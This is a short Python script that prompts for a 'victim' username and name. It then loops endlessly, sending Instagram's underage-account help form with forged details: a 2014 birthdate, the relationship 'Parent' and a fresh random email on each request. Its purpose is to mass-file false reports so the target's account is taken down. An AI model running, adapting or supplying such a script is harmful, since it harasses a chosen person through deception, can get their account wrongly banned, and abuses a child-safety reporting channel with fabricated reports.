import os
try:
 import requests,random
 from datetime import datetime
except:
 os.system('pip install requests')
 os.system('pip install random')
 os.system('pip install datetime')
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
os.system('clear')
user=input(f'[+] Victim UserName : ')
name=input(f'[+] Victim Name : ')
print(f'=======================================')
head={
    "Host": "help.instagram.com",
    "content-length": "715",
    "x-fb-lsd": "AVq5uabXj48",
    "x-asbd-id": "129477",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Android 8.0.0; Plume L2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
    "sec-ch-ua": "\" Not A;Brand\";v\u003d\"99\", \"Chromium\";v\u003d\"99\", \"Google Chrome\";v\u003d\"99\"",
    "sec-ch-ua-platform": "\"Android\"",
    "content-type": "application/x-www-form-urlencoded",
    "accept": "*/*",
    "origin": "https://help.instagram.com",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://help.instagram.com/contact/723586364339719",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-US,en;q\u003d0.9,ar-DZ;q\u003d0.8,ar;q\u003d0.7,fr;q\u003d0.6,hu;q\u003d0.5",
    "cookie": "ig_nrcb\u003d1"}
r=0
while True:
 dt1 = datetime.now()
 ts1 = str(datetime.timestamp(dt1)).split('.')[0]
 us='qwertyuiopasdfghjklzxcvbnm._1234567890'
 boy=str("".join(random.choice(us)for i in range(10)))
 email=boy+'@gmail.com'
 data=f'jazoest=2931&lsd=AVq5uabXj48&Field258021274378282={user}&Field735407019826414={name}&Field506888789421014[year]=2014&Field506888789421014[month]=11&Field506888789421014[day]=11&Field294540267362199=Parent&inputEmail={email}&support_form_id=723586364339719&support_form_locale_id=en_US&support_form_hidden_fields=%7B%7D&support_form_fact_false_fields=[]&__user=0&__a=1&__req=6&__hs=19552.BP%3ADEFAULT.2.0..0.0&dpr=1&__ccg=GOOD&__rev=1007841948&__s=s4c6vz%3Anapxo9%3An9ncx2&__hsi=7255652935514227640&__dyn=7xe6E5aQ1PyUbFuC1swgE98nwgU6C7UW8xi642-7E2vwXw5ux60Vo1upE4W0OE2WxO2O1Vwooa81VohwnU1e42C220qu1Tw40wdq0Ho2ewnE3fw6iw4vwbS1Lw4Cwcq&__csr=&__spin_r=1007841948&__spin_b=trunk&__spin_t={ts1}'
 res=requests.post('https://help.instagram.com/ajax/help/contact/submit/page',data=data,headers=head).status_code
 print(f'[+] Status Code : {res}')